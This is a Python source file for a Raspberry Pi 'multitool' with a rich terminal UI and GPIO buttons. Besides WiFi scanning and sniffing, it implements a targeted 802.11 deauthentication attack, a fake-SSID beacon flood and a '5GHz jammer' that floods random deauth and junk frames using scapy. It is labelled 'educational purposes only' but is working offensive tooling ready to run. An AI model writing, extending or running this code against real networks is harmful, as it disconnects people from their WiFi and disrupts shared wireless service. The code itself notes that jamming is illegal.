#!/usr/bin/env python3
"""
ESP32 Multitool -> Raspberry Pi 4 Python Port (TUI Version)
5GHz WiFi Jammer + Terminal User Interface + GPIO Button Control
Educational purposes only!
"""

import os
import sys
import time
import threading
import subprocess
from datetime import datetime
from rich.console import Console
from rich.layout import Layout
from rich.panel import Panel
from rich.table import Table
from rich.live import Live
from rich.text import Text
from rich import box
import scapy.all as scapy
from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt, Dot11Deauth, RadioTap

# GPIO для кнопки
try:
    import RPi.GPIO as GPIO
    GPIO_AVAILABLE = True
except ImportError:
    GPIO_AVAILABLE = False

# ======================== КОНФИГУРАЦИЯ ========================

BTN_NAV_PIN = 17
BTN_ACT_PIN = 27
LED_PIN = 22

WIFI_INTERFACE = "wlan0"

# ======================== ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ ========================

console = Console()

class ToolState:
    def __init__(self):
        self.current_module = 0
        self.module_running = False
        self.module_names = [
            "Home", "WiFi Scan", "WiFi Sniffer", "WiFi Deauth",
            "Beacon Flood", "5GHz Jammer"
        ]
        
        self.networks = []
        self.pkt_total = 0
        self.pkt_mgmt = 0
        self.pkt_data = 0
        self.pkt_ctrl = 0
        self.pkt_deauth = 0
        self.pkt_beacon = 0
        self.sniff_channel = 36
        
        self.deauth_target = -1
        self.deauth_sent = 0
        
        self.beacons_sent = 0
        self.jam_channel = 36
        
        self.worker_thread = None
        self.stop_flag = threading.Event()
        self.monitor_enabled = False
        
        self.log_messages = []
        self.start_time = time.time()

state = ToolState()

# ======================== WIFI UTILITIES ========================

def log(msg):
    """Добавить сообщение в лог"""
    timestamp = datetime.now().strftime("%H:%M:%S")
    state.log_messages.append(f"[{timestamp}] {msg}")
    if len(state.log_messages) > 50:
        state.log_messages.pop(0)

def enable_monitor_mode():
    if state.monitor_enabled:
        return True
    try:
        subprocess.run(['sudo', 'systemctl', 'stop', 'NetworkManager'], 
                      capture_output=True, timeout=5)
        subprocess.run(['sudo', 'airmon-ng', 'check', 'kill'], 
                      capture_output=True, timeout=5)
        subprocess.run(['sudo', 'ip', 'link', 'set', WIFI_INTERFACE, 'down'], 
                      capture_output=True, timeout=5)
        subprocess.run(['sudo', 'iw', WIFI_INTERFACE, 'set', 'monitor', 'none'], 
                      capture_output=True, timeout=5)
        subprocess.run(['sudo', 'ip', 'link', 'set', WIFI_INTERFACE, 'up'], 
                      capture_output=True, timeout=5)
        
        state.monitor_enabled = True
        log(f"Monitor mode enabled on {WIFI_INTERFACE}")
        return True
    except Exception as e:
        log(f"Monitor mode failed: {e}")
        return False

def disable_monitor_mode():
    if not state.monitor_enabled:
        return
    try:
        subprocess.run(['sudo', 'ip', 'link', 'set', WIFI_INTERFACE, 'down'], 
                      capture_output=True, timeout=5)
        subprocess.run(['sudo', 'iw', WIFI_INTERFACE, 'set', 'type', 'managed'], 
                      capture_output=True, timeout=5)
        subprocess.run(['sudo', 'ip', 'link', 'set', WIFI_INTERFACE, 'up'], 
                      capture_output=True, timeout=5)
        subprocess.run(['sudo', 'systemctl', 'start', 'NetworkManager'], 
                      capture_output=True, timeout=5)
        
        state.monitor_enabled = False
        log("Monitor mode disabled")
    except Exception as e:
        log(f"Disable monitor failed: {e}")

def set_channel(channel, freq_band='5GHz'):
    try:
        if freq_band == '5GHz':
            freq = 5000 + (channel * 5)
        else:
            freq = 2407 + (channel * 5)
        
        subprocess.run(['sudo', 'iw', WIFI_INTERFACE, 'set', 'freq', str(freq)], 
                      capture_output=True, timeout=2)
        return True
    except Exception as e:
        log(f"Set channel failed: {e}")
        return False

# ======================== MODULE: WIFI SCAN ========================

def wifi_scan_5ghz():
    state.networks = []
    log("Starting WiFi scan...")
    
    try:
        was_monitor = state.monitor_enabled
        if was_monitor:
            disable_monitor_mode()
        
        result = subprocess.run(
            ['sudo', 'iwlist', WIFI_INTERFACE, 'scan'],
            capture_output=True, text=True, timeout=10
        )
        
        lines = result.stdout.split('\n')
        current_net = {}
        
        for line in lines:
            line = line.strip()
            if 'Cell' in line and 'Address:' in line:
                if current_net:
                    state.networks.append(current_net)
                current_net = {'bssid': line.split('Address: ')[1]}
            elif 'ESSID:' in line:
                ssid = line.split('ESSID:')[1].strip('"')
                current_net['ssid'] = ssid if ssid else '(hidden)'
            elif 'Channel:' in line:
                current_net['channel'] = int(line.split('Channel:')[1])
            elif 'Frequency:' in line and 'GHz' in line:
                freq = float(line.split('Frequency:')[1].split()[0])
                current_net['freq'] = freq
                current_net['band'] = '5GHz' if freq > 5.0 else '2.4GHz'
            elif 'Signal level=' in line:
                rssi = line.split('Signal level=')[1].split()[0]
                current_net['rssi'] = int(rssi)
            elif 'Encryption key:' in line:
                current_net['encrypted'] = 'on' in line
        
        if current_net:
            state.networks.append(current_net)
        
        state.networks = [n for n in state.networks if n.get('band') == '5GHz']
        
        if was_monitor:
            enable_monitor_mode()
        
        log(f"Found {len(state.networks)} 5GHz networks")
        
    except Exception as e:
        log(f"WiFi scan failed: {e}")

# ======================== MODULE: WIFI SNIFFER ========================

def packet_handler(pkt):
    if not pkt.haslayer(Dot11):
        return
    
    state.pkt_total += 1
    
    if pkt.type == 0:
        state.pkt_mgmt += 1
        if pkt.subtype == 8:
            state.pkt_beacon += 1
        elif pkt.subtype == 12:
            state.pkt_deauth += 1
    elif pkt.type == 1:
        state.pkt_ctrl += 1
    elif pkt.type == 2:
        state.pkt_data += 1

def sniffer_worker():
    log(f"Sniffer started on channel {state.sniff_channel}")
    enable_monitor_mode()
    set_channel(state.sniff_channel, '5GHz')
    
    state.pkt_total = 0
    state.pkt_mgmt = 0
    state.pkt_data = 0
    state.pkt_ctrl = 0
    state.pkt_deauth = 0
    state.pkt_beacon = 0
    
    try:
        scapy.sniff(iface=WIFI_INTERFACE, prn=packet_handler, 
                   stop_filter=lambda x: state.stop_flag.is_set(), 
                   timeout=1, store=False)
    except Exception as e:
        log(f"Sniffer error: {e}")
    
    log("Sniffer stopped")

# ======================== MODULE: WIFI DEAUTH ========================

def deauth_worker():
    if state.deauth_target < 0 or state.deauth_target >= len(state.networks):
        log("Invalid deauth target")
        return
    
    target = state.networks[state.deauth_target]
    target_mac = target['bssid']
    channel = target.get('channel', 36)
    
    log(f"Deauth target: {target['ssid']} ({target_mac}) ch{channel}")
    
    enable_monitor_mode()
    set_channel(channel, '5GHz')
    
    state.deauth_sent = 0
    broadcast = "ff:ff:ff:ff:ff:ff"
    
    try:
        while not state.stop_flag.is_set():
            pkt1 = RadioTap() / Dot11(addr1=broadcast, addr2=target_mac, addr3=target_mac) / Dot11Deauth(reason=7)
            pkt2 = RadioTap() / Dot11(addr1=target_mac, addr2=broadcast, addr3=target_mac) / Dot11Deauth(reason=7)
            
            scapy.sendp(pkt1, iface=WIFI_INTERFACE, count=5, inter=0.01, verbose=False)
            scapy.sendp(pkt2, iface=WIFI_INTERFACE, count=5, inter=0.01, verbose=False)
            
            state.deauth_sent += 10
            time.sleep(0.1)
            
    except Exception as e:
        log(f"Deauth error: {e}")
    
    log("Deauth stopped")

# ======================== MODULE: BEACON FLOOD ========================

def beacon_flood_worker():
    fake_ssids = [
        "Free_5G_WiFi", "Airport_5GHz", "Hotel_Guest_5G", "FBI_Van",
        "Pretty_Fly_WiFi", "Wu_Tang_LAN", "Bill_Wi_Science_Fi",
        "LAN_Solo", "Virus_Distribution", "Loading...", "404_Network"
    ]
    
    log("Beacon flood started")
    enable_monitor_mode()
    
    state.beacons_sent = 0
    channels_5ghz = [36, 40, 44, 48, 52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140, 144, 149, 153, 157, 161, 165]
    
    try:
        while not state.stop_flag.is_set():
            for ssid in fake_ssids:
                if state.stop_flag.is_set():
                    break
                
                channel = channels_5ghz[state.beacons_sent % len(channels_5ghz)]
                set_channel(channel, '5GHz')
                
                src_mac = f"{scapy.RandMAC()}"
                dot11 = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff', 
                             addr2=src_mac, addr3=src_mac)
                beacon = Dot11Beacon(cap='ESS+privacy')
                essid = Dot11Elt(ID='SSID', info=ssid, len=len(ssid))
                
                frame = RadioTap() / dot11 / beacon / essid
                scapy.sendp(frame, iface=WIFI_INTERFACE, count=1, verbose=False)
                state.beacons_sent += 1
                
                time.sleep(0.05)
                
    except Exception as e:
        log(f"Beacon flood error: {e}")
    
    log("Beacon flood stopped")

# ======================== MODULE: 5GHz JAMMER ========================

def jammer_5ghz_worker():
    log(f"5GHz Jammer started on channel {state.jam_channel}")
    enable_monitor_mode()
    set_channel(state.jam_channel, '5GHz')
    
    jam_count = 0
    
    try:
        while not state.stop_flag.is_set():
            for _ in range(10):
                if state.stop_flag.is_set():
                    break
                
                src = scapy.RandMAC()
                dst = scapy.RandMAC()
                
                pkt1 = RadioTap() / Dot11(addr1=dst, addr2=src, addr3=src) / Dot11Deauth(reason=7)
                pkt2 = RadioTap() / Dot11(type=2, addr1=dst, addr2=src, addr3=src) / scapy.Raw(load=os.urandom(100))
                
                scapy.sendp([pkt1, pkt2], iface=WIFI_INTERFACE, inter=0.001, verbose=False)
                jam_count += 2
            
            time.sleep(0.01)
            
    except Exception as e:
        log(f"Jammer error: {e}")
    
    log(f"Jammer stopped (sent {jam_count} packets)")

# ======================== MODULE CONTROL ========================

def start_module(module_id):
    stop_current_module()
    
    state.current_module = module_id
    state.module_running = True
    state.stop_flag.clear()
    
    if module_id == 1:
        threading.Thread(target=wifi_scan_5ghz, daemon=True).start()
    elif module_id == 2:
        state.worker_thread = threading.Thread(target=sniffer_worker, daemon=True)
        state.worker_thread.start()
    elif module_id == 3:
        state.worker_thread = threading.Thread(target=deauth_worker, daemon=True)
        state.worker_thread.start()
    elif module_id == 4:
        state.worker_thread = threading.Thread(target=beacon_flood_worker, daemon=True)
        state.worker_thread.start()
    elif module_id == 5:
        state.worker_thread = threading.Thread(target=jammer_5ghz_worker, daemon=True)
        state.worker_thread.start()

def stop_current_module():
    if not state.module_running:
        return
    
    state.stop_flag.set()
    
    if state.worker_thread and state.worker_thread.is_alive():
        state.worker_thread.join(timeout=2)
    
    state.module_running = False

# ======================== GPIO BUTTON HANDLER ========================

def setup_gpio():
    if not GPIO_AVAILABLE:
        return
    
    GPIO.setmode(GPIO.BCM)
    GPIO.setup(BTN_NAV_PIN, GPIO.IN, pull_up_down=GPIO.PUD_UP)
    GPIO.setup(BTN_ACT_PIN, GPIO.IN, pull_up_down=GPIO.PUD_UP)
    GPIO.setup(LED_PIN, GPIO.OUT)
    
    GPIO.add_event_detect(BTN_NAV_PIN, GPIO.FALLING, 
                         callback=button_nav_callback, bouncetime=300)
    GPIO.add_event_detect(BTN_ACT_PIN, GPIO.FALLING, 
                         callback=button_act_callback, bouncetime=300)
    
    log("GPIO buttons configured")

def button_nav_callback(channel):
    stop_current_module()
    state.current_module = (state.current_module + 1) % len(state.module_names)
    log(f"NAV -> {state.module_names[state.current_module]}")
    
    if GPIO_AVAILABLE:
        for _ in range(state.current_module + 1):
            GPIO.output(LED_PIN, GPIO.HIGH)
            time.sleep(0.1)
            GPIO.output(LED_PIN, GPIO.LOW)
            time.sleep(0.1)

def button_act_callback(channel):
    if state.module_running:
        stop_current_module()
        log("ACT -> STOP")
    else:
        start_module(state.current_module)
        log(f"ACT -> START {state.module_names[state.current_module]}")

# ======================== TUI RENDERING ========================

def create_header():
    uptime = int(time.time() - state.start_time)
    hours = uptime // 3600
    minutes = (uptime % 3600) // 60
    seconds = uptime % 60
    
    status = "[green]RUNNING[/green]" if state.module_running else "[yellow]IDLE[/yellow]"
    
    text = Text()
    text.append("⚡ RPi4 MULTITOOL ", style="bold cyan")
    text.append(f"| Module: ", style="dim")
    text.append(f"{state.module_names[state.current_module]} ", style="bold yellow")
    text.append(f"| Status: ")
    text.append(status)
    text.append(f" | Uptime: {hours:02d}:{minutes:02d}:{seconds:02d}", style="dim")
    
    return Panel(text, box=box.DOUBLE, border_style="cyan")

def create_module_panel():
    if state.current_module == 0:  # Home
        table = Table(show_header=False, box=box.SIMPLE)
        table.add_column("Key", style="cyan")
        table.add_column("Action")
        table.add_row("1-5", "Select module")
        table.add_row("SPACE", "Start/Stop current module")
        table.add_row("s", "WiFi Scan")
        table.add_row("↑/↓", "Navigate (Deauth target)")
        table.add_row("q", "Quit")
        
        return Panel(table, title="[bold]Controls[/bold]", border_style="green")
    
    elif state.current_module == 1:  # WiFi Scan
        table = Table(show_header=True, box=box.SIMPLE)
        table.add_column("№", style="cyan", width=3)
        table.add_column("SSID", style="yellow")
        table.add_column("BSSID", style="dim")
        table.add_column("Ch", width=4)
        table.add_column("RSSI", width=6)
        
        for i, net in enumerate(state.networks[:15]):
            selected = "→" if i == state.deauth_target else " "
            table.add_row(
                f"{selected}{i}",
                net.get('ssid', '?'),
                net.get('bssid', '?'),
                str(net.get('channel', '?')),
                f"{net.get('rssi', '?')} dB"
            )
        
        return Panel(table, title=f"[bold]WiFi Networks (5GHz) - {len(state.networks)} found[/bold]", 
                    border_style="yellow")
    
    elif state.current_module == 2:  # Sniffer
        table = Table(show_header=True, box=box.SIMPLE)
        table.add_column("Metric", style="cyan")
        table.add_column("Count", style="yellow", justify="right")
        
        table.add_row("Total Packets", f"{state.pkt_total:,}")
        table.add_row("Management", f"{state.pkt_mgmt:,}")
        table.add_row("Data", f"{state.pkt_data:,}")
        table.add_row("Control", f"{state.pkt_ctrl:,}")
        table.add_row("Deauth", f"{state.pkt_deauth:,}")
        table.add_row("Beacon", f"{state.pkt_beacon:,}")
        table.add_row("Channel", f"{state.sniff_channel}")
        
        return Panel(table, title="[bold]WiFi Sniffer Stats[/bold]", border_style="blue")
    
    elif state.current_module == 3:  # Deauth
        target_info = "None"
        if 0 <= state.deauth_target < len(state.networks):
            net = state.networks[state.deauth_target]
            target_info = f"{net.get('ssid', '?')} ({net.get('bssid', '?')})"
        
        table = Table(show_header=False, box=box.SIMPLE)
        table.add_column("", style="cyan")
        table.add_column("", style="yellow")
        
        table.add_row("Target", target_info)
        table.add_row("Frames Sent", f"{state.deauth_sent:,}")
        table.add_row("", "")
        table.add_row("Tip", "Press 's' to scan, ↑/↓ to select target")
        
        return Panel(table, title="[bold red]WiFi Deauth Attack[/bold red]", border_style="red")
    
    elif state.current_module == 4:  # Beacon Flood
        table = Table(show_header=False, box=box.SIMPLE)
        table.add_column("", style="cyan")
        table.add_column("", style="yellow")
        
        table.add_row("Beacons Sent", f"{state.beacons_sent:,}")
        table.add_row("Fake SSIDs", "11")
        table.add_row("Status", "[green]Flooding...[/green]" if state.module_running else "[dim]Stopped[/dim]")
        
        return Panel(table, title="[bold]Beacon Flood[/bold]", border_style="magenta")
    
    elif state.current_module == 5:  # 5GHz Jammer
        freq = 5000 + (state.jam_channel * 5)
        
        table = Table(show_header=False, box=box.SIMPLE)
        table.add_column("", style="cyan")
        table.add_column("", style="yellow")
        
        table.add_row("Channel", f"{state.jam_channel}")
        table.add_row("Frequency", f"{freq} MHz")
        table.add_row("Status", "[red blink]JAMMING[/red blink]" if state.module_running else "[dim]Stopped[/dim]")
        table.add_row("", "")
        table.add_row("[red]⚠ WARNING", "WiFi jamming is illegal![/red]")
        
        return Panel(table, title="[bold red]5GHz Jammer[/bold red]", border_style="red")
    
    return Panel("Unknown module", border_style="red")

def create_log_panel():
    log_text = "\n".join(state.log_messages[-10:])
    return Panel(log_text, title="[bold]Log[/bold]", border_style="dim", height=12)

def create_layout():
    layout = Layout()
    layout.split_column(
        Layout(name="header", size=3),
        Layout(name="body"),
        Layout(name="log", size=12)
    )
    
    layout["header"].update(create_header())
    layout["body"].update(create_module_panel())
    layout["log"].update(create_log_panel())
    
    return layout

# ======================== KEYBOARD INPUT ========================

def handle_input():
    import sys
    import tty
    import termios
    
    fd = sys.stdin.fileno()
    old_settings = termios.tcgetattr(fd)
    
    try:
        tty.setraw(sys.stdin.fileno())
        while True:
            ch = sys.stdin.read(1)
            
            if ch == 'q':
                return False
            elif ch == ' ':
                if state.module_running:
                    stop_current_module()
                else:
                    start_module(state.current_module)
            elif ch == 's':
                threading.Thread(target=wifi_scan_5ghz, daemon=True).start()
            elif ch in '12345':
                state.current_module = int(ch) - 1
            elif ch == '\x1b':  # Arrow keys
                next1 = sys.stdin.read(1)
                next2 = sys.stdin.read(1)
                if next1 == '[':
                    if next2 == 'A':  # Up
                        if state.deauth_target > 0:
                            state.deauth_target -= 1
                    elif next2 == 'B':  # Down
                        if state.deauth_target < len(state.networks) - 1:
                            state.deauth_target += 1
            
            time.sleep(0.05)
    finally:
        termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)

# ======================== MAIN ========================

def main():
    console.clear()
    console.print("[bold cyan]RPi4 Multitool - Terminal UI[/bold cyan]")
    console.print("[yellow]Educational purposes only![/yellow]\n")
    
    if os.geteuid() != 0:
        console.print("[red]ERROR: This script must be run as root![/red]")
        console.print("Usage: sudo python3 rpi_multitool_tui.py")
        sys.exit(1)
    
    log("System started")
    log(f"WiFi Interface: {WIFI_INTERFACE}")
    
    if GPIO_AVAILABLE:
        setup_gpio()
    else:
        log("GPIO not available - button control disabled")
    
    # Запуск потока обработки ввода
    input_thread = threading.Thread(target=handle_input, daemon=True)
    input_thread.start()
    
    try:
        with Live(create_layout(), refresh_per_second=4, screen=True) as live:
            while input_thread.is_alive():
                live.update(create_layout())
                time.sleep(0.25)
    except KeyboardInterrupt:
        pass
    finally:
        console.print("\n[yellow]Shutting down...[/yellow]")
        stop_current_module()
        disable_monitor_mode()
        if GPIO_AVAILABLE:
            GPIO.cleanup()
        console.print("[green]Done![/green]")

if __name__ == '__main__':
    main()
